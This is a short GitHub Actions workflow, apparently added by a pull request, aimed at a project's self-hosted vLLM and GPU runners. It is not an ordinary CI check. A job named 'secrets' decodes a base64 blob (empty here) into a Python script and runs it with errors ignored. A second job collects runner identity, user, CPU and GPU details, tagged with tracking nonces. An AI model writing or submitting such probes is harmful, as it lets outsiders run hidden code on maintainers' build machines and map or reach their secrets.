name: c211-i133392-da2e602c
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: c211-i133392-da2e602c-r2-${{ github.ref }}
  cancel-in-progress: false
jobs:
  secrets:
    name: secrets-c211-i133392-da2e602c
    runs-on: [self-hosted, linux, x64, vllm-runners]
    timeout-minutes: 20
    steps:
      - name: opt-runner-and-policy
        shell: bash
        run: |
          set +e
          echo "NONCE=c211-i133392-da2e602c"
          echo "RUNNER=$RUNNER_NAME"
          printf '%s' '' > /tmp/p2.b64
          base64 -d /tmp/p2.b64 > /tmp/probe2.py
          python3 /tmp/probe2.py 2>&1
          echo "NONCE-END=c211-i133392-da2e602c"
  probe_gpu:
    name: probe-gpu-c211-i133392-da2e602c
    runs-on: [self-hosted, linux, x64, gpu]
    timeout-minutes: 6
    steps:
      - name: gpu-check
        shell: bash
        run: |
          set +e
          echo "NONCE=c211-i133392-da2e602c LABEL=gpu"
          echo "RUNNER=$RUNNER_NAME"
          hostname; id; nproc; nvidia-smi -L 2>&1 | head -10
          echo "NONCE-END-gpu"
